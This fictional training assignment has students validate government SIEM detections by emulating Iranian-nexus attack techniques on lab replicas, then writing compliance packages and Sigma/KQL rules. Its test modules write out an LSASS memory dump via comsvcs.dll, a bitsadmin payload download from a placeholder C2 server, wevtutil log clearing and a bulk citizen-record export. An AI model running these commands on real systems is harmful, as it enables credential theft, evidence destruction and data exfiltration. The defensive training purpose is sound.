# Assignment 8: Adversary Emulation and Detection Validation — Iranian-Nexus TTPs Against Government Digital Infrastructure

> **Sector:** Israeli Government / National Digital Services  
> **Organization Type:** National government agency — critical national infrastructure  
> **Regulatory Framework:** INCD-CID, MATZBEN, Israeli Government Information Security Standard  
> **Scenario Type:** Detection validation (bonus) — validate GovID 2.0 and VRID detections against Iranian-nexus tradecraft  
> **Estimated Effort:** 30–40 hours  
> **Level:** Senior CTI Analyst / Detection Validation Engineer

---

## Preface

Government adversary emulation is not like private-sector red teaming. Every test requires formal authorization in writing. Every technique must be pre-approved by a security officer. INCD must be notified before any emulation exercise to prevent the exercise from being mistaken for a real incident (see Complicating Factor CF-01 in Assignment 5 — this scenario is the planned version of what happened accidentally). The classified network has no lab equivalent. You will need to validate detections on systems that cannot be freely reconfigured without 5 business days of change control. And the person who approves your test plan is the same person who will be embarrassed if your tests reveal that the detections don't work.

Despite all of this, detection validation is not optional. INCD-CID Section 8 (Threat-Based Testing) requires annual validation of critical infrastructure detection capability. This assignment is your compliance mechanism and your defense against the next incident.

---

## Section 1: Context

### 1.1 Emulation Mission

**Mission:** Validate the detection coverage deployed on NDSA's GovID 2.0 and VRID infrastructure against Iranian-nexus adversary tradecraft documented in:
1. The Assignment 5 incident (NDSA internal threat actor assessment, March 2025)
2. CERT-IL Bulletin CB-2025-041 (Assignment 6 Trigger 2)
3. "Operation Desert Cipher" — Mandiant Intelligence Report (Fictional, from Assignment 4) — Iranian-nexus cluster targeting Israeli government digital infrastructure

**Scope:**
- **In-scope systems:** NDSA GOVNET Operational Segment; GovID 2.0 Frontend Cluster (lab replica); VRID-SRV-01 (lab replica); JUMPHOST-CONTRACTOR-01 (lab replica); NDSA Elastic SIEM
- **Out-of-scope systems:** GOVNET Classified Segment (no lab equivalent; emulation is out of scope by INCD directive); Production VRID database; Ministry Integration Bus (MoI dependency; requires separate authorization)
- **Authorized emulation team:** NDSA internal Detection Engineering team (lead: Gila Ben-Moshe; supported by new CTI Lead Shai Rotenberg) + approved external red team from CyberShield Ltd.
- **INCD oversight:** Emulation exercise must be pre-approved and coordinated with Friedman under INCD-CID Section 8

### 1.2 Detection Inventory at Time of Emulation

At the start of this assignment, the following detections are deployed in NDSA's Elastic SIEM:

| Detection ID | Rule Name | ATT&CK Coverage | Status | Known Issues |
|---|---|---|---|---|
| GOV-DET-001 | Contractor VPN off-hours logon | T1133 | Active | High FP rate on evening shifts |
| GOV-DET-002 | Lateral movement from Contractor DMZ | T1021.001 | Active | 30-minute correlation delay |
| GOV-DET-003 | BITS job to non-Microsoft ASN | T1197 | Active | Not deployed on GovID 2.0 nodes |
| GOV-DET-004 | wevtutil log clear | T1070.001 | Active | Confirmed working; fires within 2 min |
| GOV-DET-005 | vrid_query.exe full-table SELECT | T1005 | Active | VRID-SRV-01 only; not applicable to GovID 2.0 |
| GOV-DET-006 | Biometric API bulk extraction | T1530 | Draft | Not yet deployed — built in Assignment 6 |
| GOV-DET-007 | GovID API rate limit bypass attempt | T1110 | Draft | Not yet deployed |
| GOV-DET-008 | Staging-to-production API cross-contamination | T1078.002 | Draft | Not yet deployed; Sprint 23 fix required first |
| GOV-DET-009 | AiTM phishing lookalike domain resolution | T1566.001 | Draft | Requires DNS monitoring on contractor endpoints |
| GOV-DET-010 | comsvcs.dll LSASS GrantedAccess 0x1410 | T1003.001 | Active | Known issue: fires on backup tools; high FP |

**Total: 6 active rules, 4 draft rules. Detection gaps from Assignment 5 assessment indicate coverage missing for: supply chain initial access, TOTP seed exfiltration via M365, and data diode boundary monitoring.**

### 1.3 Government-Specific Constraints

Unlike private-sector red team exercises, this emulation operates under:

**C-1: Formal Change Control (MATZBEN Section 11)**
Any change to a production GOVNET system — including deploying a detection rule, installing an agent, or modifying a firewall rule — requires a formal Change Request (CR) approved by the NDSA Change Advisory Board (CAB). CAB meets every Tuesday; approval timeline is minimum 5 business days. Emergency changes (security-related) can be expedited to 48 hours but require DG's office notification.

*Implication: You cannot deploy GOV-DET-006 through GOV-DET-009 until you have CAB approval. This means you must submit CRs before the emulation date to have the rules live before testing.*

**C-2: Security Officer Pre-Approval per Test Module**
MATZBEN Section 9 requires written security officer approval before any authorized penetration test or emulation technique is executed. The NDSA Security Officer is a separate role from the CISO (Col. Nativ is CISO; the Security Officer is Maj. (Res.) Tamir Cohen). Cohen must review and approve each test module — he is not technically sophisticated and requires plain-language descriptions of every technique. Cohen is also known to be conservative: he will reject any technique that "sounds like a real attack" if the description is too technical or alarming.

*Implication: Every technique description in your emulation plan must be translated into plain language that Cohen will approve. For particularly sensitive techniques (LSASS access, log clearing), you must include both the technical description and a "what happens to the system if this goes wrong" safety analysis.*

**C-3: INCD Pre-Notification Mandatory**
INCD-CID Section 8(c) requires NDSA to notify INCD of any authorized adversary emulation exercise at least 5 business days before the exercise begins. This notification prevents INCD from treating the exercise as a real incident, avoids INCD responding to NDSA's own test, and ensures INCD can correlate exercise artifacts when reviewing NDSA's detection logs.

*Complication: INCD's pre-notification creates a window in which INCD knows the exercise timeline. If INCD's classified tier has information about real ongoing adversary operations against NDSA, INCD may advise postponing the exercise — which could delay detection validation and push back INCD-CID Section 8 compliance.*

**C-4: No Lab Equivalent for GOVNET Classified Segment**
The GOVNET Classified Segment (airgapped, MATZBEN-governed) has no approved lab replica for emulation purposes. This means:
- Detections on the classified segment cannot be tested
- Data diode bypass techniques cannot be emulated
- Detection coverage on the classified side must be assessed via theoretical analysis only, not live testing

*Implication: The emulation results will have a known gap. Your final coverage matrix must explicitly mark classified-segment-dependent detections as "not validated — theoretical coverage only."*

**C-5: CyberShield Ltd. Red Team — Clearance Limitations**
The external red team from CyberShield Ltd. does not have MATZBEN clearances. They can operate in the lab environment (isolated from production systems) but cannot access GOVNET production or the PAM system. Their exercise is isolated to the lab replica environment.

*Implication: Any detection that fires on the production PAM system but not the lab replica will show a validation gap. PAM-based detections must be validated separately by the NDSA internal team.*

---

## Section 2: Source CTI Report — Iranian-Nexus Government Targeting

### 2.1 Composite Threat Actor Profile

The emulation is based on a **composite Iranian-nexus threat profile** derived from:
1. The NDSA Assignment 5 incident TTPs (confirmed; internal evidence)
2. CERT-IL Bulletin CB-2025-041 (biometric targeting; medium-high confidence)
3. Operation Desert Cipher attribution (pharma/fintech overlap; medium confidence; see Assignment 4)
4. ClearSky Cyber Security report "CloudGuard IL-2024" (contractor supply chain targeting; medium confidence)

**Adversary tradecraft summary (for emulation planning):**

| Phase | Technique | Source | Confidence |
|---|---|---|---|
| Initial Access | AiTM phishing of contractor personal email | NDSA Assignment 5 incident | Confirmed |
| Initial Access | Lookalike domain targeting developer credentials | CERT-IL CB-2025-041 | High |
| Initial Access | Compromised vendor API token reuse | Assignment 6 Trigger 4 + UAE incident | Medium |
| Credential Access | TOTP seed extraction from cloud backup | Assignment 5 analysis | Confirmed |
| Credential Access | comsvcs.dll LSASS dump attempt (partial) | Assignment 5 confirmed | Confirmed |
| Credential Access | M365 session token theft via AiTM | CERT-IL + Assignment 5 | High |
| Discovery | Domain / group enumeration via net.exe | Assignment 5 PAM recording | Confirmed |
| Discovery | DNS resolution of internal target (vrid-srv) | Assignment 5 netflow | Confirmed |
| Lateral Movement | RDP from contractor jump host to VRID-SRV | Assignment 5 PAM recording | Confirmed |
| Persistence | BITS job deploying second-stage agent | Assignment 5 confirmed | Confirmed |
| Persistence | Service installation (SvcHostMonitor) | Assignment 5 event logs | Confirmed |
| Collection | Internal tool misuse (vrid_query.exe full-table) | Assignment 5 confirmed | Confirmed |
| Exfiltration | Multi-chunk HTTPS exfiltration via BITS | Assignment 5 netflow | Confirmed |
| Defense Evasion | wevtutil log clear (Security, System, Application) | Assignment 5 confirmed | Confirmed |
| Defense Evasion | Non-standard executable path (C:\Windows\Temp\) | Assignment 5 confirmed | Confirmed |

### 2.2 GovID 2.0 Specific Adversary Tradecraft (Projected)

Based on CERT-IL CB-2025-041 and the BiometricTech IL Ltd. API probing (Assignment 6 Trigger 4), the adversary is also assessed to use:

| Phase | Technique | Source | Confidence |
|---|---|---|---|
| Initial Access | Compromised biometric vendor API token | Assignment 6 Triggers 1+4 | Medium |
| Credential Access | API token theft from exposed developer repository | Assignment 6 Trigger 3 | Medium |
| Collection | Bulk API extraction via /verify/bulk endpoint | Assignment 6 Trigger 4 + UAE incident | Medium |
| Collection | Staged exfiltration via authenticated API calls | UAE incident pattern | Medium |
| Reconnaissance | API surface scanning using stolen credentials | Assignment 6 Trigger 4 | Medium |

---

## Section 3: Emulation Plan Structure

### 3.1 Emulation Scenarios (Test Modules)

The emulation is divided into 7 test modules. Each module has a Detection ID under test, a technique to emulate, and a pass/fail criterion.

**Module 1: Off-Hours Contractor VPN Logon (GOV-DET-001)**

*Technique:* T1133 — External Remote Services  
*Emulation:* Connect to contractor VPN from a non-corporate-ASN IP address at 02:00 IST; authenticate with a test contractor credential.  
*Pass criterion:* Alert fires within 5 minutes; alert contains: source IP, username, ASN classification (non-corporate), time.  
*Complication:* Rule currently has a high FP rate because it fires on evening shift connections from home offices. The evening shift issue must be separated from the "non-corporate ASN at night" scenario. Define the tuning change needed to separate these.

**Module 2: Contractor DMZ Lateral Movement (GOV-DET-002)**

*Technique:* T1021.001 — Remote Desktop Protocol  
*Emulation:* From JUMPHOST-CONTRACTOR-01 lab replica, initiate RDP to VRID-SRV-01 lab replica using test contractor account.  
*Pass criterion:* Alert fires within 35 minutes (acknowledging the known 30-minute delay); alert correctly identifies source (Contractor DMZ) and destination (Operational Segment).  
*Complication:* The 30-minute delay is a known architectural issue. Your emulation must document whether 30 minutes is acceptable for this threat scenario (attacker dwell time in Assignment 5 was 4 hours — 30 minutes is within window). But for a faster attacker, the delay is a gap.

**Module 3: BITS Job to External C2 (GOV-DET-003)**

*Technique:* T1197 — BITS Jobs  
*Emulation:* On VRID-SRV-01 lab replica, execute: `bitsadmin /transfer testjob /download /priority normal "https://[emulation-C2-server]/test.bin" "C:\Windows\Temp\test.bin"` where emulation-C2-server is a CyberShield-controlled test domain.  
*Pass criterion:* Alert fires within 10 minutes; alert contains BITS job name, destination domain, source host.  
*Complication:* Rule is NOT deployed on GovID 2.0 nodes. Secondary test: confirm the rule does NOT fire on a GovID 2.0 lab node (expected gap). Document gap formally.

**Module 4: LSASS Access via comsvcs.dll (GOV-DET-010)**

*Technique:* T1003.001 — LSASS Memory  
*Emulation:* On VRID-SRV-01 lab replica (SYSTEM context), execute: `rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [LSASS PID] C:\Windows\Temp\test.dmp full`  
*Pass criterion:* Alert fires within 5 minutes; GrantedAccess value 0x1410 is captured in alert.  
*Complication:* The production rule has a high FP rate from backup tools accessing LSASS. Emulation must test both: (a) the true positive (direct comsvcs.dll MiniDump call) and (b) a simulated backup tool LSASS access to verify the FP suppression logic. If the FP suppression incorrectly suppresses the true positive, this is a critical finding.

**Module 5: Log Clear Followed by Agent Restart (GOV-DET-004 + gap detection)**

*Technique:* T1070.001 — Clear Windows Event Logs  
*Emulation:* On VRID-SRV-01 lab replica, execute `wevtutil cl Security`, `wevtutil cl System`, `wevtutil cl Application` in sequence. Then stop and restart the Winlogbeat agent.  
*Pass criterion (GOV-DET-004):* Alert fires within 2 minutes of wevtutil execution.  
*Secondary criterion (gap detection):* The corrected gap detection rule (from Assignment 5 Task 4) must fire within 30 minutes of Winlogbeat agent stopping; alert must correctly identify the log gap duration.  
*Complication:* The original 12-hour quiet period bug — verify the fix is deployed and functioning. Test the edge case: a legitimate 2-hour maintenance window followed by a log clear. The corrected rule must not fire during legitimate maintenance windows.

**Module 6: Full-Table Database Query (GOV-DET-005)**

*Technique:* T1005 — Data from Local System  
*Emulation:* On VRID-SRV-01 lab replica, execute `vrid_query.exe -q "SELECT name, national_id, biometric_hash, last_verified FROM citizen_records" -o C:\Windows\Temp\test_export` using the test contractor service account.  
*Pass criterion:* Alert fires within 5 minutes; alert captures: process name, command-line arguments (confirming full-table SELECT pattern), executing account.  
*Complication:* `vrid_query.exe` is a legitimate internal tool. The rule must distinguish between: (a) a full-table SELECT (suspicious) and (b) a query with a WHERE clause scoped to a specific citizen (legitimate). Emulate both and verify only (a) fires.

**Module 7: GovID 2.0 Bulk API Extraction Probe (GOV-DET-006 — draft rule)**

*Technique:* T1530 — Data from Cloud Storage Object (adapted to government API context)  
*Emulation:* From an authorized CyberShield-controlled test client, authenticate to the GovID 2.0 lab frontend using a valid but test-only API token, then call `/verify/bulk` with 500 requests in rapid succession (automated, simulating the behavior from Assignment 6 Trigger 4 — 2,400 calls/day = ~1.7 calls/minute, but the emulation compresses this).  
*Pass criterion:* Alert fires within 10 minutes; alert captures: source IP, API endpoint called, request volume, token identifier.  
*Complication:* GOV-DET-006 is a draft rule — NOT YET DEPLOYED. This module tests whether the rule works as designed in a lab environment before it is submitted for CAB approval. If the rule fails, document the failure mode and the fix required.

---

## Section 4: Tasks

### Task 1: Pre-Emulation Planning and Government Compliance

**Requirements:**

1. Produce the **INCD Section 8 Notification Package** — the formal pre-notification that NDSA must submit to INCD at least 5 business days before the exercise begins. The notification must include:
   - Emulation scope and timeline
   - Systems to be tested (lab replicas; production excluded)
   - Techniques to be emulated (described at a level appropriate for INCD review — not so technical it triggers concerns; not so vague it fails to satisfy notification requirements)
   - Containment measures (how NDSA ensures the emulation does not escape the lab)
   - Contact person and emergency escalation procedure
   - INCD acknowledgment request

2. Produce the **Security Officer Approval Package** for Maj. (Res.) Tamir Cohen. Cohen requires plain-language descriptions. For each of the 7 test modules:
   - Plain-language title (no ATT&CK IDs, no technical jargon)
   - What the test does in 2 sentences a non-technical security officer can read
   - What happens to the system during the test (is there any risk to the lab systems?)
   - What happens if the test goes wrong
   - Safety measures in place

3. Produce the **Change Request (CR) package** for the 4 draft detection rules (GOV-DET-006 through GOV-DET-009) that are not yet deployed. The CR must be suitable for CAB review:
   - Change title, type, and priority
   - Systems affected
   - Rollback plan if the rule causes service disruption
   - Test evidence (from Task 2 emulation results — note: you will need to write this retroactively after Module 7 emulation)
   - Risk assessment (what risk does not deploying the rule carry? what risk does deploying it carry?)

4. Build the **emulation timeline** accounting for all government constraints:
   - Week 1: Submit INCD notification + Security Officer package + CABs for draft rules
   - Week 2: Await approvals
   - Week 3: Execute emulation (assuming approvals received)
   - Week 4: Analysis and reporting
   
   Show the critical path and identify the single approval bottleneck that most threatens the timeline.

5. Address the **classified segment gap**: Write a **theoretical coverage analysis** for the GOVNET Classified Segment detections that cannot be live-tested. For each classified-segment-dependent detection item, assess: (a) whether the detection logic would function correctly based on known architecture; (b) what evidence would confirm or deny function without live testing; (c) what compensating control can substitute for live validation.

---

### Task 2: Emulation Execution and Results Documentation

**Requirements:**

1. For each of the 7 test modules, produce an **Emulation Test Report** covering:
   - Test module ID and name
   - Technique emulated (ATT&CK ID + name)
   - Exact command or action taken (safe, documented)
   - Expected detection behavior
   - Actual detection behavior (PASS / FAIL / PARTIAL)
   - Alert details if fired (time-to-detection, fields captured, accuracy)
   - Root cause of failure if applicable
   - Recommended fix if applicable

2. For each FAILED or PARTIAL module, produce a **Detection Failure Analysis**:
   - What specific condition caused the detection to fail?
   - Is the failure a rule logic error, a log ingestion gap, a timing issue, or an architectural gap?
   - What is the risk of leaving this gap unaddressed?
   - What is the remediation path (rule fix, architectural change, compensating control)?
   - What is the estimated time to remediate?

3. Produce a **Comparative Gap Analysis** — compare the detections that failed in this emulation against the gaps identified in Assignment 5:
   - Did the Assignment 5 incident reveal gaps that have now been fixed?
   - Did the Assignment 5 incident reveal gaps that this emulation confirms are STILL open?
   - Did this emulation reveal NEW gaps not identified in Assignment 5?
   - What does this tell you about the quality of the post-incident remediation?

4. Address **Module 4 complication in detail**: the LSASS access FP suppression test. Write a structured analysis of the risk that the FP suppression logic incorrectly suppresses a true positive. Provide:
   - The specific rule condition that creates the risk
   - A test case that would expose the incorrect suppression
   - The corrected rule logic
   - A management summary explaining the risk for the CISO

5. Address **Module 7 (GOV-DET-006 draft rule) in detail**: since this rule is not yet deployed, the emulation is a pre-deployment test. If the rule fails in the lab:
   - What is the CAB submission timeline impact?
   - Is there a compensating control that provides coverage while the rule is fixed?
   - Write the corrected rule logic based on the observed failure mode

---

### Task 3: Coverage Matrix and Gap Backlog

**Requirements:**

1. Produce the **Detection Coverage Matrix** for the GovID 2.0 and VRID infrastructure. The matrix must cover:
   - All ATT&CK techniques from Section 2 (14 confirmed + 5 projected)
   - For each technique: Detection Rule ID (if exists), Emulation Result (PASS/FAIL/PARTIAL/NOT TESTED), Coverage Status, Gap Priority
   - Explicitly mark: (a) techniques with no coverage; (b) techniques with coverage but failed validation; (c) techniques only on specific systems (VRID-SRV-01 but not GovID 2.0); (d) classified-segment-only techniques that cannot be validated

2. Calculate the **coverage percentage** across three categories:
   - Confirmed adversary TTPs (from Assignment 5 incident — highest priority)
   - Projected adversary TTPs (from CERT-IL + UAE incident — medium priority)
   - Total (combined)
   
   Note: a rule that exists but failed emulation counts as PARTIAL coverage, not full coverage.

3. Produce the **Gap Backlog** — the remediation list derived from the coverage matrix. Each item must contain:
   | Field | Description |
   |---|---|
   | Gap ID | GAP-GOV-0xx |
   | Gap Description | What the attacker can do that we cannot detect |
   | ATT&CK Technique | Technique(s) not covered |
   | System Affected | Which NDSA system has the gap |
   | Root Cause | Rule missing / Rule failed / Architectural gap / Classified-only |
   | Detection Approach | How to address the gap |
   | Estimated Effort | Engineering days |
   | Priority | P1 / P2 / P3 |
   | INCD-CID Compliance Risk | Yes/No (does this gap affect INCD-CID Section 8 compliance?) |

4. Map the gap backlog to **INCD-CID Section 8 compliance**: INCD requires annual detection validation. Present a compliance status table showing: total detections tested, pass rate, gaps identified, remediation plan submitted. If any P1 gaps remain unaddressed, the compliance status is "non-compliant pending remediation plan." Write the non-compliance statement if applicable.

5. Write the **INCD Section 8 Compliance Report** — the formal annual validation report that NDSA submits to INCD following the exercise. The report must cover:
   - Exercise scope and methodology
   - Summary of results (coverage %, pass rate)
   - Gaps identified and their classifications
   - Remediation plan and timeline
   - Signatures (CTI Lead, CISO, INCD Liaison acknowledgment)

---

### Task 4: Detection Rules — Fix and Improve

For each detection that failed or was partial, produce the corrected rule.

**Requirements:**

1. Fix **GOV-DET-001** (off-hours contractor VPN): the rule fires on home-office connections in the evening. Rewrite the rule to distinguish between: (a) connections from a contractor's known home IP range (not suspicious) and (b) connections from a novel non-corporate ASN (suspicious). Describe what enrichment data is needed (contractor known-IP registry) and how it would be maintained.

2. Fix **GOV-DET-002** (lateral movement from Contractor DMZ): address the 30-minute correlation delay. Is the delay a SIEM correlation rule design issue, a log shipping delay, or an architectural timing issue? For each possible cause, propose a fix. Estimate the maximum acceptable time-to-detection for this technique given the observed attacker behavior in Assignment 5 (4-hour dwell time).

3. Write **GOV-DET-006** (bulk API extraction — GovID 2.0) as a deployable Sigma rule AND Elastic KQL query. The rule must:
   - Detect 50+ calls to `/verify/bulk` from a single source IP within 10 minutes
   - Not fire on scheduled batch verification jobs (which run at 03:00 IST daily from a known internal IP)
   - Capture: source IP, token identifier, request count, time window
   - Be deployable on the GovID 2.0 frontend cluster Elastic agent

4. Write **GOV-DET-011** (new): AiTM phishing infrastructure resolution on contractor endpoints. This rule does not yet exist. It should fire when a contractor endpoint resolves a domain matching the pattern of known phishing lookalike domains (e.g., `govid-il-auth[.]net`, `biometric-verify-gov-il[.]com`). Design:
   - Log source required (DNS resolver logs; requires Sysmon DNS monitoring on contractor endpoints — which are NOT currently Sysmon-enabled)
   - Sigma rule + KQL
   - Dependency: Sysmon deployment on contractor endpoints requires HavayaIT cooperation AND a CAB CR — estimated 3-week timeline
   - Compensating control while Sysmon is pending (e.g., DNS RPZ on the corporate resolver)

5. Write **GOV-DET-012** (new): TOTP seed in email / credential self-forwarding. Based on Assignment 5 finding that Halevi forwarded his TOTP seed to his personal email:
   - This is a DATA LOSS PREVENTION scenario, not a SIEM scenario
   - Describe the DLP rule that would catch this behavior in HavayaIT's M365 tenant (NDSA does not control HavayaIT's M365)
   - Since NDSA cannot deploy DLP in a vendor's tenant, write a **contractual requirement** for NDSA's vendor security policy that mandates HavayaIT implement this DLP rule and provide quarterly compliance attestation
   - Estimate: if this contractual requirement had been in place, would it have prevented Assignment 5?

---

### Task 5: Emulation Findings Communication

**Requirements:**

1. Write the **Emulation Results Briefing** for CISO Col. Nativ (15-minute verbal briefing format; produce speaker notes):
   - Key findings (3–5 bullets)
   - Pass/fail summary
   - Highest-priority gap with specific risk consequence
   - Recommended immediate actions (next 2 weeks)
   - Timeline to full remediation

2. Write the **Executive Summary** for DG Dr. Shamir (1 page, plain language):
   - What was tested and why
   - What we found
   - What it means for NDSA's risk posture
   - What is being done about it
   - Are we compliant with the INCD mandate?

3. Write the **SOC Feedback Summary** for Gila Ben-Moshe:
   - Which detections are working well (acknowledge the wins)
   - Which detections need tuning (specific instructions for SOC-level tuning)
   - Which gaps require engineering work (out of SOC scope — escalation required)
   - New hunting hypothesis: "VRID database access by non-scheduled query — targeting full biometric record extraction"

4. Produce the **Vendor Security Findings Letter** to HavayaIT Systems Ltd. following the emulation exercise. The emulation validated that the Assignment 5 attack path (contractor VPN → Contractor DMZ → lateral movement to VRID) remains partially detectable but still exploitable in specific conditions. This letter must:
   - Notify HavayaIT of the detection validation results (without disclosing classified aspects)
   - Specify security improvements required of HavayaIT within 90 days: (a) MFA on all NDSA-access accounts without exception; (b) prohibition on TOTP seeds stored in personal email; (c) DLP on corporate M365 tenant for government credential keywords; (d) regular security awareness training with attestation
   - State the contractual basis for these requirements
   - Specify consequence of non-compliance (contract review / access suspension)

5. Write the **INCD Section 8 Formal Submission** package final version, incorporating all findings from Tasks 2–4. The submission is a compliance document and will be retained on NDSA's regulatory record. Ensure it is accurate, complete, and defensible.

---

## Section 5: Deliverables Summary

| # | Deliverable | Audience | Format |
|---|---|---|---|
| 1 | INCD Section 8 pre-notification package | INCD (via Friedman) | Formal notification |
| 2 | Security Officer approval package (7 modules) | Maj. Cohen | Plain-language descriptions |
| 3 | CAB change request package (4 draft rules) | NDSA CAB | CR documentation |
| 4 | Emulation timeline (with constraint mapping) | CTI Lead, CISO | Timeline table |
| 5 | Theoretical coverage analysis (classified segment) | CISO | 2-page analysis |
| 6 | Emulation test reports (7 modules) | Detection Eng | Test reports |
| 7 | Detection failure analyses (failed/partial modules) | Detection Eng | Analysis documents |
| 8 | Comparative gap analysis (vs. Assignment 5) | CTI Lead, CISO | Comparative table |
| 9 | Detection coverage matrix (19 techniques) | CISO, INCD | Matrix table |
| 10 | Gap backlog (all gaps with priority and INCD risk) | CISO, Detection Eng | Structured table |
| 11 | INCD Section 8 compliance report | INCD | Formal report |
| 12 | Fixed Sigma rules + KQL (GOV-DET-001, -002, -006) | Detection Eng | YAML + KQL |
| 13 | New rules GOV-DET-011, GOV-DET-012 | Detection Eng | YAML / vendor requirement |
| 14 | CISO results briefing (speaker notes) | CISO | Briefing notes |
| 15 | DG executive summary | DG | 1-page summary |
| 16 | SOC feedback summary | SOC Manager | Operational brief |
| 17 | Vendor security findings letter (HavayaIT) | HavayaIT | Formal letter |
| 18 | INCD Section 8 final submission | INCD | Formal submission |

---

## Section 6: Assessment Criteria

| Criterion | Weight | What Examiners Look For |
|---|---|---|
| Government compliance packaging (INCD, Security Officer, CAB) | 25% | Accuracy, plain-language translation, completeness |
| Emulation execution and technical rigor | 20% | Correct technique emulation; honest PASS/FAIL documentation |
| Coverage matrix accuracy | 15% | Complete coverage; classified gap correctly handled |
| Detection rule quality (fixes + new rules) | 20% | Deployable Sigma; correct KQL; gap closure logic |
| Communication deliverables | 20% | CISO briefing is crisp; DG summary is plain; vendor letter is precise |

---

## Appendix A: Detection Rule Templates

### Sigma Rule Template (NDSA Standard)

```yaml
title: [Rule Title]
id: [UUID]
status: experimental
description: [One-sentence description]
author: NDSA CTI / Detection Engineering
date: [YYYY/MM/DD]
references:
  - [INCD bulletin or internal reference]
  - [ATT&CK technique URL]
tags:
  - attack.[tactic]
  - attack.[technique_id]
  - ndsa.govid
logsource:
  category: [windows or network or application]
  product: [windows or zeek or custom]
detection:
  selection:
    [field]: [value]
  condition: selection
falsepositives:
  - [known FP scenario]
  - [known FP scenario]
level: [informational / low / medium / high / critical]
fields:
  - [field1]
  - [field2]
```

### KQL Template (Elastic Security, NDSA)

```
// Rule: [Rule Title]
// Author: NDSA CTI / DE
// ATT&CK: [Technique]
// Index: [winlogbeat-* / filebeat-* / etc.]
// Last Updated: [date]

[field1]: "[value1]" AND [field2]: "[value2]"
| WHERE [condition]
| STATS count(*) BY [grouping_field]
| WHERE count > [threshold]
```

---

## Appendix B: INCD-CID Section 8 Summary Requirements

Per INCD-CID Section 8 (Threat-Based Testing, Version 3.1 2024):

| Requirement | Detail |
|---|---|
| **8(a)** Annual testing | Critical infrastructure operators must conduct annual detection validation |
| **8(b)** Scope | Testing must cover top-5 threat scenarios per the operator's threat model |
| **8(c)** Pre-notification | INCD notification at least 5 business days before exercise |
| **8(d)** Report | Formal compliance report submitted within 30 days of exercise completion |
| **8(e)** Gap remediation | Critical gaps (P1) must have a remediation plan within 60 days of report |
| **8(f)** INCD review | INCD may request additional information or re-test within 90 days |

---

*This scenario is fictional and created for educational use in CTI and detection engineering training. All organizations, individuals, domains, IP addresses, and simulated findings are invented. The emulation techniques described are documented at a level appropriate for defensive CTI training and do not constitute offensive capability development instructions.*
